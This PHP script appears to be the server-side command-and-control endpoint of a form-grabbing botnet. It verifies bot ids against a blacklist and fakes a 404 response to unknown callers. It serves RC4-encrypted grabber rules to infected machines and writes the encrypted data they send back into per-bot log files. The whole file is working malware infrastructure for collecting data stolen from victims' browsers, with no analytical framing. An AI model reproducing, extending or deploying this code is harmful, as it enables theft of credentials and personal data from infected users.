<?php
error_reporting(0);
include("./config.php");

function return404(){header("HTTP/1.0 404 Not Found");header("Status: 404 Not Found");die();}
function rc4Crypt($key, $pt) {
	$s = array();
	for ($i=0; $i<256; $i++) {
		$s[$i] = $i;
	}
	$j = 0;
	$x;
	for ($i=0; $i<256; $i++) {
		$j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
	}
	$i = 0;
	$j = 0;
	$ct = '';
	$y;
	for ($y=0; $y<strlen($pt); $y++) {
		$i = ($i + 1) % 256;
		$j = ($j + $s[$i]) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
		$ct .= $pt[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
	}
	return $ct;
}

$id=(float)$_GET["id"];
if($id==0){return404();}
	
if(!@mysql_connect($settings['mysql_host'],$settings['mysql_user'],$settings['mysql_pass'])){return404();}
if(!@mysql_select_db($settings['mysql_db'])){return404();}

$qres=@mysql_query("SELECT * FROM blacklist RIGHT JOIN bots ON blacklist.id=bots.id WHERE bots.id=$id AND blacklist.id IS NULL LIMIT 1");
if(mysql_num_rows($qres)==0){return404();}

$content="";
$qres=@mysql_query("SELECT rule FROM fg WHERE enabled=1 ORDER BY id");
$cl=5; // crc32 + last zero
while($row=mysql_fetch_assoc($qres))
	{
	$rule=htmlspecialchars_decode($row['rule']);
	$content.=$rule."\0";
	$cl+=strlen($rule)+1;
	}
header("Content-Type: application/octet-stream");
header("Content-Length: $cl");
$content.="\0";
echo(pack("V",crc32($content)));
echo(rc4Crypt($settings['rc4key'],$content));

$data=file_get_contents("php://input");
if(strlen($data)==0){exit;}
$data=explode("|",rc4Crypt($settings['rc4key'],base64_decode($data)));
$id=sprintf("%08X",$id);
if(!empty($data[2]))
	{
	@mkdir("./fg_logs");
	@chmod("./fg_logs",0766);
	if($log=@fopen("./fg_logs/$id.log","a"))
		{
		fwrite($log,"$data[0]\r\n$data[1]\r\n$data[2]\r\n\r\n");
		fclose($log);
		}
	}
?>